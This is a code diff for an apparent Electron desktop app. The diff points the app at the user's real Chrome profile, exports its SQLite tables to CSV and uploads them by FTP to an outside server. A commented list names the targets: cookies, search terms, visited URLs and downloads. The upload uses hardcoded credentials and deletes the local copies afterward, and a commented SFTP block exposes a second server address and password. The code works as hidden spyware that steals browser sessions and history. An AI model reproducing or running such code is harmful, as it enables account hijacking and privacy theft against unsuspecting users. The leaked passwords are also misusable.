@@ -9,11 +9,12 @@ const csvWriter = require('csv-write-stream');
 const uuidv4 = require('uuid/v4');
 // const Client = require('ssh2-sftp-client');
 const EasyFtp = require('easy-ftp');
+const Client = require('ssh2-sftp-client');
 
 const AutoLaunch = require('auto-launch');
  
 const sprintf = sprintfJs.sprintf,
-    vsprintf = sprintfJs.vsprintf
+    vsprintf = sprintfJs.vsprintf;
 
 let runningStatus = 'running';
 let runningStatusIcon = 'play_arrow';
@@ -21,11 +22,19 @@ let playButtonLabel = 'stop';
 let playButtonIcon = 'stop';
 
 let uploadTime1,
-    uploadTime2;
+    uploadTime2,
+    uploadTime3,
+    uploadTime4;
 
 let chromeProfilePath;
 
 const basePath = remote.app.getAppPath();
+
+let flag = false;
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
 
 SQL.dbOpen = function (databaseFileName) {
     try {
@@ -74,7 +83,7 @@ $(document).ready(function () {
     });
 
     $('#play-button').on("click", function(e) {
-        runUpload();
+        //runUpload();
         if (runningStatus == 'running') {
             runningStatus = 'stopped';
             runningStatusIcon = 'stop';
@@ -100,11 +109,11 @@ $(document).ready(function () {
     uploadTime1 = $('#upload-time1').val();
     uploadTime2 = $('#upload-time2').val();
 
-    setInterval(runUpload, 60 * 1000);//this means 1min
+    // setInterval(runUpload, 60 * 1000);
     // setInterval(runUpload, 60 * 1000);
 });
 
-function runUpload() {
+async function runUpload() {
     const current = new Date();
     // let dateTime = current.toISOString().substr(0, 19);
     const dateTime = sprintf('%d %02d:%02d',
@@ -113,11 +122,10 @@ function runUpload() {
     );
     console.log(dateTime);
     if (dateTime != uploadTime1 && dateTime != uploadTime2) {
-        // return;
+        return;
     }
-    // chromeProfilePath = remote.app.getPath('home') + '\\AppData\\Local\\Google\\Chrome\\User Data';
-    // chromeProfilePath += '\\Default\\';
-    chromeProfilePath = sprintf('%s/req/', basePath);
+    chromeProfilePath = remote.app.getPath('home') + '\\AppData\\Local\\Google\\Chrome\\User Data';
+    chromeProfilePath += '\\Default\\';
     console.log(chromeProfilePath);
 
     // const current = new Date();
@@ -131,12 +139,17 @@ function runUpload() {
         fs.mkdirSync(dir);
     }    
         
+    
     for (let i in fileList) {
+        flag = true;
         convertCsvAndUpload(fileList[i], dateString, uuid);
+        while (flag) {
+            await sleep(1000);
+        }
     }
 };
 
-function convertCsvAndUpload(file, dateString, uuid) {
+async function convertCsvAndUpload(file, dateString, uuid) {
     /////////////////=================read and export csv============
     const fileName = file.fileName;
     const tables = file.tables;
@@ -165,6 +178,7 @@ function convertCsvAndUpload(file, dateString, uuid) {
         let fields;
         let sql;
         let rows;
+        // table_index = 0;
         for (let i in tables) {
             tableName = tables[i];
             csvName = sprintf('%s/csvs/%s_%s_%s.csv', basePath, tableName, dateString, uuid);
@@ -188,22 +202,98 @@ function convertCsvAndUpload(file, dateString, uuid) {
             }
             writer.end();
 
-                    
-            // let ftp = new EasyFtp();
-            // const config = {
-            //     host: '127.0.0.1',
-            //     port: 21,
-            //     username: 'test',
-            //     password: 'test',
-            //     type : 'ftp'
-            // };
-            // ftp.connect(config);
-            // ftp.upload(csvName, "/csvs/", function(err){
-            //     console.log('upload', err);
+            
+            let ftp = new EasyFtp();
+            const config = {
+                host: 'ftp.salakit.com',
+                port: 21,
+                username: 'csvup@salakit.com',
+                password: 'wtrRt2@sypQ',
+                type : 'ftp'
+            };
+            ftp.connect(config);
+            delay = true;
+            ftp.upload(csvName, "/csvs/", function (err) {
+                console.log(tableName, err);
+                
+                fs.unlink(csvName, (err) => {
+                    if (err) {
+                        // alert("An error ocurred updating the file" + err.message);
+                        console.log(err, tableName);
+                        return;
+                    }
+                    delay = false;
+                //     console.log("File succesfully deleted", tableName);
+                });
+            })
+            // .then(function() {
+            // });
+                
+            console.log('csvName', tableName);
+            while (delay) {
+                await sleep(1000);
+            }
+            // let sftp = new Client();
+            // sftp.connect({
+            //     host: '206.189.45.15',
+            //     port: '22',
+            //     username: 'wwwadmin',
+            //     password: '97dp2et87a7eaf23a1ccc73319a'
+            // }).catch((err) => {
+            //     console.log(err, 'catch error');
+            // });
+            // sftp.put(csvName, "/home/wwwadmin/csv/")
+            // .catch((err) => {
+            //     console.log(err, 'catch error');
+            // });
+            // sftp.end()
+            // .catch((err) => {
+            //     console.log(err, 'catch error');
             // });
         }
     }
+    console.log("flag = false");
+    flag = false;
 }
+
+function make_csv_and_upload_step_by_step() {
+
+}
+
+// const fileList = [
+//     {
+//         fileName: 'Cookies',
+//         table: 'cookies',
+//     },
+//     {
+//         fileName: 'History',
+//         table: 'downloads',
+//     },
+//     {
+//         fileName: 'History',
+//         table: 'downloads_url_chains',
+//     },
+//     {
+//         fileName: 'History',
+//         table: 'keyword_search_terms',
+//     },
+//     {
+//         fileName: 'History',
+//         table: 'segment_usage',
+//     },
+//     {
+//         fileName: 'History',
+//         table: 'segments',
+//     },
+//     {
+//         fileName: 'History',
+//         table: 'urls',
+//     },
+//     {
+//         fileName: 'History',
+//         table: 'visits',
+//     },
+// ];
 
 const fileList = [
     {
